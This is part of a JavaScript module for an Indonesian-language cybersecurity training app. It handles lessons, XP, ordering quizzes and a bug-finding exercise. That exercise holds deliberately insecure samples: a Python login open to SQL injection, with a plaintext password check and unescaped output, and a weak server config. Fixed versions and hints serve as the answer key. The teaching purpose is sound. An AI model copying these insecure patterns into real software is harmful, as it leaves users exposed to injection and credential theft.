  ctRenderProgressOverview();

  setTimeout(() => ctNextLesson(), 800);
}

function ctNextLesson() {
  const level = CT_CURRICULUM.find(l => l.id === ctState.currentLevel);
  if (!level) return;
  if (ctState.currentTopicIdx < level.topics.length - 1) {
    ctOpenTopic(ctState.currentLevel, ctState.currentTopicIdx + 1);
  } else {
    const currentLevelIndex = CT_CURRICULUM.findIndex(l => l.id === ctState.currentLevel);
    if (currentLevelIndex < CT_CURRICULUM.length - 1) {
      const nextLevel = CT_CURRICULUM[currentLevelIndex + 1];
      ctOpenTopic(nextLevel.id, 0);
    } else {
      if (typeof showToast === 'function') showToast('🎓', '🛡️ Semua level selesai! Kamu siap jadi Security Professional!');
    }
  }
}

function ctPrevLesson() {
  if (ctState.currentTopicIdx > 0) {
    ctOpenTopic(ctState.currentLevel, ctState.currentTopicIdx - 1);
  } else {
    const currentLevelIndex = CT_CURRICULUM.findIndex(l => l.id === ctState.currentLevel);
    if (currentLevelIndex > 0) {
      const prevLevel = CT_CURRICULUM[currentLevelIndex - 1];
      ctOpenTopic(prevLevel.id, prevLevel.topics.length - 1);
    }
  }
}

// ================================================================
// TAB SWITCHING
// ================================================================
function ctSwitchTab(tabName, btn) {
  ctState.currentTab = tabName;
  document.querySelectorAll('.ct-tab-content').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.ct-tab').forEach(t => t.classList.remove('active'));
  const target = document.getElementById('ct-tab-' + tabName);
  if (target) target.classList.add('active');
  if (btn) btn.classList.add('active');
  else {
    const tabs = document.querySelectorAll('.ct-tab');
    const tabOrder = ['explain', 'example', 'editor', 'quiz', 'challenge'];
    const idx = tabOrder.indexOf(tabName);
    if (tabs[idx]) tabs[idx].classList.add('active');
  }
}

// ================================================================
// XP & LEVEL
// ================================================================
function ctAddXP(amount) {
  ctState.xp += amount;
  const xpForLevel = CT_XP_LEVELS[ctState.level] || 99999;
  if (ctState.xp >= xpForLevel && ctState.level < CT_XP_LEVELS.length) {
    ctState.level++;
    ctShowBadge('⚡ Level Up! Sekarang Level ' + ctState.level + ' — ' + ctGetRank(ctState.xp));
  }
  ctUpdateXPBar();
  ctSave();
  if (typeof addXP === 'function') addXP(Math.round(amount * 0.5));
}

function ctUpdateXPBar() {
  const xpEl = document.getElementById('ct-xp-display');
  const lvEl = document.getElementById('ct-level-display');
  const stEl = document.getElementById('ct-streak-display');
  const rkEl = document.getElementById('ct-rank-label');
  const barEl = document.getElementById('ct-xp-bar');
  const curEl = document.getElementById('ct-xp-cur');
  const nxtEl = document.getElementById('ct-xp-next');

  if (xpEl) xpEl.textContent = ctState.xp;
  if (lvEl) lvEl.textContent = ctState.level;
  if (stEl) stEl.textContent = ctState.streak;
  if (rkEl) rkEl.textContent = ctGetRank(ctState.xp);

  const xpMin = CT_XP_LEVELS[ctState.level - 1] || 0;
  const xpMax = CT_XP_LEVELS[ctState.level] || 12000;
  const pct = Math.min(Math.round(((ctState.xp - xpMin) / (xpMax - xpMin)) * 100), 100);
  if (barEl) barEl.style.width = pct + '%';
  if (curEl) curEl.textContent = ctState.xp - xpMin;
  if (nxtEl) nxtEl.textContent = xpMax - xpMin;
}

// ================================================================
// PROGRESS OVERVIEW
// ================================================================
function ctRenderProgressOverview() {
  const el = document.getElementById('ct-progress-overview');
  if (!el) return;
  el.innerHTML = '';
  CT_CURRICULUM.forEach(lv => {
    const total = lv.topics.length;
    const done = lv.topics.filter(t => ctState.completedTopics.includes(t.id)).length;
    const pct = total > 0 ? Math.round((done / total) * 100) : 0;
    const card = document.createElement('div');
    card.className = 'ct-progress-card';
    card.innerHTML = `
      <div class="pc-icon">${lv.icon}</div>
      <div class="pc-name" style="color:${pct===100?'var(--green)':'var(--text)'}">${lv.name}</div>
      <div class="pc-bar-wrap"><div class="pc-bar" style="width:${pct}%;background:${lv.color}"></div></div>
      <div class="pc-pct">${done}/${total} · ${pct}%</div>
    `;
    card.onclick = () => ctOpenTopic(lv.id, 0);
    el.appendChild(card);
  });
}

// ================================================================
// NAVIGATION HELPERS
// ================================================================
function ctStartFromBeginning() {
  const first = CT_CURRICULUM[0];
  ctOpenTopic(first.id, 0);
}

function ctContinueLearning() {
  const allTopics = ctAllTopics();
  const next = allTopics.find(t => !ctState.completedTopics.includes(t.id));
  if (next) {
    const lvl = CT_CURRICULUM.find(l => l.id === next.levelId);
    ctOpenTopic(next.levelId, lvl?.topics.findIndex(t => t.id === next.id) || 0);
  } else {
    ctStartFromBeginning();
  }
}

function ctShowWelcome() {
  document.getElementById('ct-welcome-screen').style.display = 'block';
  document.getElementById('ct-lesson-screen').style.display = 'none';
  document.getElementById('ct-dragdrop-screen').style.display = 'none';
  document.getElementById('ct-debug-screen').style.display = 'none';
}

// ================================================================
// DAILY CHALLENGE
// ================================================================
const CT_DAILY = [
  { title: 'Threat Hunting', desc: 'Review log sistem kamu selama 30 menit. Temukan minimal 1 anomali. Reward: 200 XP' },
  { title: 'Password Audit', desc: 'Periksa semua password akun pentingmu. Update yang lemah. Reward: 150 XP' },
  { title: 'CTF Beginner', desc: 'Selesaikan 1 easy machine di TryHackMe atau HackTheBox. Reward: 300 XP' },
  { title: 'OWASP Study', desc: 'Pelajari 2 kerentanan OWASP Top 10 yang belum kamu kuasai. Reward: 180 XP' },
  { title: 'Tool Practice', desc: 'Latihan 30 menit menggunakan Nmap atau Burp Suite di lab. Reward: 200 XP' },
  { title: 'Phishing Test', desc: 'Kirim phishing awareness quiz ke 3 rekan (dengan etis & izin). Reward: 120 XP' },
  { title: 'Writeup Reading', desc: 'Baca dan rangkum 2 bug bounty writeup dari HackerOne Hacktivity. Reward: 160 XP' },
];

function ctUpdateDailyChallenge() {
  const day = new Date().getDay();
  const ch = CT_DAILY[day % CT_DAILY.length];
  const titleEl = document.getElementById('ct-daily-title');
  const descEl = document.getElementById('ct-daily-desc');
  if (titleEl) titleEl.textContent = ch.title;
  if (descEl) descEl.textContent = ch.desc;
}

function ctStartDailyChallenge() {
  const day = new Date().getDay();
  const ch = CT_DAILY[day % CT_DAILY.length];
  ctStartFromBeginning();
  if (typeof showToast === 'function') showToast('🎯', 'Daily: ' + ch.title + ' — selamat berjuang!');
}

// ================================================================
// DRAG & DROP — Attack/Defense Flows
// ================================================================
const CT_DD_CHALLENGES = [
  {
    instruction: 'Susun tahap Penetration Testing dalam urutan yang benar (PTES)',
    tags: ['Reporting', 'Exploitation', 'Reconnaissance', 'Post-Exploitation', 'Pre-engagement', 'Scanning & Enumeration'],
    correct: ['Pre-engagement', 'Reconnaissance', 'Scanning & Enumeration', 'Exploitation', 'Post-Exploitation', 'Reporting'],
  },
  {
    instruction: 'Susun fase Incident Response (NIST) dalam urutan yang benar',
    tags: ['Recovery', 'Eradication', 'Post-Incident', 'Detection & Analysis', 'Preparation', 'Containment'],
    correct: ['Preparation', 'Detection & Analysis', 'Containment', 'Eradication', 'Recovery', 'Post-Incident'],
  },
  {
    instruction: 'Susun langkah TLS Handshake dalam urutan yang benar',
    tags: ['Data Transfer', 'ClientHello', 'ServerHello', 'Certificate Verification', 'Key Exchange', 'ChangeCipherSpec'],
    correct: ['ClientHello', 'ServerHello', 'Certificate Verification', 'Key Exchange', 'ChangeCipherSpec', 'Data Transfer'],
  },
  {
    instruction: 'Susun Kill Chain serangan siber (Lockheed Martin) dalam urutan yang benar',
    tags: ['Actions on Objectives', 'Reconnaissance', 'Delivery', 'Weaponization', 'Exploitation', 'C2 (Command & Control)', 'Installation'],
    correct: ['Reconnaissance', 'Weaponization', 'Delivery', 'Exploitation', 'Installation', 'C2 (Command & Control)', 'Actions on Objectives'],
  },
];

function ctShowDragDrop() {
  document.getElementById('ct-welcome-screen').style.display = 'none';
  document.getElementById('ct-lesson-screen').style.display = 'none';
  document.getElementById('ct-dragdrop-screen').style.display = 'block';
  document.getElementById('ct-debug-screen').style.display = 'none';
  ctInitDragDrop();
}

function ctInitDragDrop() {
  const ch = CT_DD_CHALLENGES[Math.floor(Math.random() * CT_DD_CHALLENGES.length)];
  const instrEl = document.getElementById('ct-dd-instruction');
  const tagsEl = document.getElementById('ct-dd-tags');
  const dropEl = document.getElementById('ct-dd-drop');

  if (instrEl) instrEl.textContent = ch.instruction;

  tagsEl.innerHTML = '<div style="font-size:11px;color:var(--text3);margin-bottom:8px;width:100%">Drag tahap:</div>';
  dropEl.innerHTML = '<div style="color:var(--text3);font-size:13px">Drop di sini dalam urutan yang benar...</div>';
  dropEl._correctOrder = ch.correct;
  dropEl._droppedItems = [];

  const shuffled = [...ch.tags].sort(() => Math.random() - 0.5);
  shuffled.forEach(tag => {
    const tagEl = document.createElement('div');
    tagEl.className = 'ct-dd-tag';
    tagEl.textContent = tag;
    tagEl.draggable = true;
    tagEl.dataset.tag = tag;
    tagEl.addEventListener('dragstart', (e) => {
      e.dataTransfer.setData('text/plain', tag);
      tagEl.style.opacity = '0.5';
    });
    tagEl.addEventListener('dragend', () => tagEl.style.opacity = '1');
    tagsEl.appendChild(tagEl);
  });

  dropEl.addEventListener('dragover', (e) => { e.preventDefault(); dropEl.classList.add('dragover'); });
  dropEl.addEventListener('dragleave', () => dropEl.classList.remove('dragover'));
  dropEl.addEventListener('drop', (e) => {
    e.preventDefault();
    dropEl.classList.remove('dragover');
    const tag = e.dataTransfer.getData('text/plain');
    dropEl._droppedItems = dropEl._droppedItems || [];
    dropEl._droppedItems.push(tag);
    const placedTag = document.createElement('div');
    placedTag.className = 'ct-dd-tag placed';
    placedTag.textContent = tag;
    const placeholder = dropEl.querySelector('div');
    if (placeholder && (placeholder.textContent.includes('Drop') || placeholder.textContent.includes('sini'))) placeholder.remove();
    dropEl.appendChild(placedTag);
    tagsEl.querySelectorAll('.ct-dd-tag').forEach(t => { if (t.dataset.tag === tag && !t.classList.contains('placed')) t.remove(); });
  });
}

function ctCheckDragDrop() {
  const dropEl = document.getElementById('ct-dd-drop');
  const placed = dropEl._droppedItems || [];
  const correct = dropEl._correctOrder || [];
  const feedback = document.getElementById('ct-dd-feedback');
  if (JSON.stringify(placed) === JSON.stringify(correct)) {
    feedback.innerHTML = '<div class="ct-tip-box">✅ Benar! Urutan sempurna! +60 XP — Kamu memahami alur ini dengan baik!</div>';
    ctAddXP(60);
  } else {
    feedback.innerHTML = '<div class="ct-error-box">❌ Belum tepat. Urutan yang benar: ' + ctEsc(correct.join(' → ')) + '</div>';
  }
}

function ctResetDragDrop() {
  ctInitDragDrop();
  const feedback = document.getElementById('ct-dd-feedback');
  if (feedback) feedback.innerHTML = '';
}

// ================================================================
// DEBUG CHALLENGE — Vulnerable Code
// ================================================================
const CT_BUGS = [
  {
    desc: 'Temukan semua kerentanan keamanan dalam kode Python login berikut.',
    buggy: `def login(username, password):
    conn = sqlite3.connect('db.sqlite')
    # Query langsung concatenation
    query = "SELECT * FROM users WHERE user='" + username + "'"
    user = conn.execute(query).fetchone()
    
    # Password disimpan plain text
    if user and user['password'] == password:
        session['user'] = username
        return "Welcome " + username  # XSS?
    return "Invalid"`,
    fixed: `def login(username, password):
    conn = sqlite3.connect('db.sqlite')
    # Parameterized query
    query = "SELECT * FROM users WHERE user=?"
    user = conn.execute(query, (username,)).fetchone()
    
    # bcrypt untuk verifikasi password
    if user and bcrypt.checkpw(password.encode(), user['password']):
        session['user'] = escape(username)
        return "Welcome " + escape(username)
    return "Invalid"`,
    hint: 'Ada 3 kerentanan: SQL Injection (string concat), plain text password (harusnya hash), dan reflected XSS (output langsung).',
  },
  {
    desc: 'Kode konfigurasi server berikut memiliki beberapa masalah keamanan. Temukan dan perbaiki!',
    buggy: `# Server config
DEBUG = True              # Debug mode
SECRET_KEY = "abc123"     # Weak secret
ALLOWED_HOSTS = ["*"]     # Semua host
DB_PASSWORD = "admin123"  # Weak password

# File upload
UPLOAD_DIR = "/tmp/"
MAX_UPLOAD = 999999999    # Unlimited size
ALLOWED_EXTENSIONS = []   # Semua ekstensi diizinkan`,
    fixed: `# Server config
DEBUG = False
SECRET_KEY = secrets.token_hex(32)  # Strong random key
ALLOWED_HOSTS = ["example.com"]

# DB password dari environment variable
DB_PASSWORD = os.environ.get('DB_PASSWORD')

# File upload
UPLOAD_DIR = "/var/app/uploads/"
MAX_UPLOAD = 10 * 1024 * 1024  # 10MB limit
ALLOWED_EXTENSIONS = ['.jpg', '.png', '.pdf']`,
    hint: 'Ada 6 masalah: DEBUG on, weak secret key, wildcard host, weak password, unlimited upload, unrestricted file extension.',
  },
];

function ctShowDebug() {
  document.getElementById('ct-welcome-screen').style.display = 'none';
  document.getElementById('ct-lesson-screen').style.display = 'none';
  document.getElementById('ct-dragdrop-screen').style.display = 'none';
  document.getElementById('ct-debug-screen').style.display = 'block';
  ctInitDebug();
}

function ctInitDebug() {
  const bug = CT_BUGS[Math.floor(Math.random() * CT_BUGS.length)];
  const descEl = document.getElementById('ct-debug-desc');
  const buggyEl = document.getElementById('ct-debug-buggy');
  const inputEl = document.getElementById('ct-debug-input');
  const feedbackEl = document.getElementById('ct-debug-feedback');

  if (descEl) descEl.textContent = bug.desc;
  if (buggyEl) buggyEl.textContent = bug.buggy;
  if (inputEl) {
    inputEl.value = '';
    inputEl._correctFixed = bug.fixed;
    inputEl._hint = bug.hint;
  }
  if (feedbackEl) feedbackEl.innerHTML = '';
}

function ctCheckDebug() {
  const input = document.getElementById('ct-debug-input');
  const typed = input.value.replace(/\s+/g, ' ').trim().toLowerCase();
  const feedback = document.getElementById('ct-debug-feedback');

  // Check for key security fixes
  const hasParamQuery = typed.includes('?') || typed.includes('parameterized') || typed.includes('execute(query,');
  const hasHashPw = typed.includes('bcrypt') || typed.includes('hashpw') || typed.includes('checkpw') || typed.includes('hash');
  const hasEscape = typed.includes('escape(') || typed.includes('html.escape') || typed.includes('markupsafe');
  const hasDebugFalse = typed.includes('debug = false') || typed.includes('debug=false');
  const hasStrongKey = typed.includes('token_hex') || typed.includes('os.environ') || typed.includes('secrets.');

  const fixes = [hasParamQuery, hasHashPw, hasEscape, hasDebugFalse, hasStrongKey].filter(Boolean).length;

  if (fixes >= 3) {
    feedback.innerHTML = `<div class="ct-tip-box">✅ Bagus! ${fixes} dari 5 perbaikan keamanan ditemukan! +100 XP<br><small>Kamu berhasil mengidentifikasi dan memperbaiki kerentanan utama!</small></div>`;
    ctAddXP(100);
  } else if (fixes >= 1) {
    feedback.innerHTML = `<div class="ct-warn-box">⚠️ ${fixes}/5 perbaikan ditemukan. Cari lebih banyak kerentanan! Hint: periksa SQL query, password handling, output encoding, debug mode, dan secret key.</div>`;
  } else {
    feedback.innerHTML = '<div class="ct-error-box">❌ Belum ada perbaikan yang terdeteksi. Baca hint dan coba lagi!</div>';
  }
}

function ctShowDebugHint() {
  const input = document.getElementById('ct-debug-input');
  const hint = input?._hint || 'Perhatikan: query SQL, cara penyimpanan password, output ke browser, konfigurasi debug, dan kunci rahasia.';
  if (typeof showToast === 'function') showToast('💡', hint);
  else alert('Hint: ' + hint);
}

// ================================================================
// UTILITIES
// ================================================================
function ctGetCurrentTopic() {
  const level = CT_CURRICULUM.find(l => l.id === ctState.currentLevel);
  return level?.topics[ctState.currentTopicIdx] || null;
}

function ctEsc(str) {
  return (str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function ctCopyToClipboard(btn, text) {
  navigator.clipboard?.writeText(text).then(() => {
    if (btn) { const orig = btn.textContent; btn.textContent = '✓ Copied!'; setTimeout(() => btn.textContent = orig, 1500); }
    else if (typeof showToast === 'function') showToast('📋', 'Kode disalin!');
  }).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
    if (typeof showToast === 'function') showToast('📋', 'Disalin!');
  });
}

function ctShowBadge(msg) {
  let badge = document.getElementById('ct-badge-popup');
  if (!badge) {
    badge = document.createElement('div');
    badge.id = 'ct-badge-popup';
    badge.className = 'ct-badge-popup';
    document.body.appendChild(badge);
  }
  badge.textContent = msg;
  badge.classList.add('show');
  setTimeout(() => badge.classList.remove('show'), 3500);
}

// Navigation hook handled by index.html

// ================================================================
// AUTO-PATCH SIDEBAR & DASHBOARD
// ================================================================
(function patchSidebarAndDashboard() {
  const sidebar = document.getElementById('sidebar');
  if (sidebar) {
    const htmlItem = [...sidebar.querySelectorAll('.nav-item')].find(n => n.getAttribute('onclick')?.includes('htmltrainer'));
    const cyberItem = document.createElement('div');
    cyberItem.className = 'nav-item';
    cyberItem.setAttribute('onclick', "navigate('cybertrainer')");
    cyberItem.innerHTML = '<span class="nav-icon">🛡️</span><span class="nav-label">Cyber Security</span>';
    if (htmlItem && htmlItem.nextSibling) {
      sidebar.insertBefore(cyberItem, htmlItem.nextSibling);
    } else {
      sidebar.appendChild(cyberItem);
    }
  }

  setTimeout(() => {
    const modesGrid = document.querySelector('.modes-grid');
    if (modesGrid) {
      const card = document.createElement('div');
      card.className = 'mode-card';
      card.style.setProperty('--card-color', '#f76a6a');
      card.setAttribute('onclick', "navigate('cybertrainer')");
      card.innerHTML = `
        <div class="mode-icon">🛡️</div>
        <h3>Cyber Security</h3>
        <p>Belajar ethical hacking, network security, forensics, dan cloud security dari pemula sampai pro.</p>
        <span class="mode-tag">10 level · 50+ topik · Real-world labs</span>
      `;
      modesGrid.appendChild(card);
    }
  }, 500);
})();

console.log('CyberSecurityTrainer: Module loaded ✓');
